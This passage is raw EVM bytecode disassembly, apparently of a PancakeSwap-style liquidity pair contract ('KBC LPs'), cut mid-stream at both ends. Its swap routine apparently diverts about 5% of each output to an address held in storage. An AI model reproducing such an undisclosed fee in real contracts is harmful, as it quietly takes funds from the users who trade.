PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO 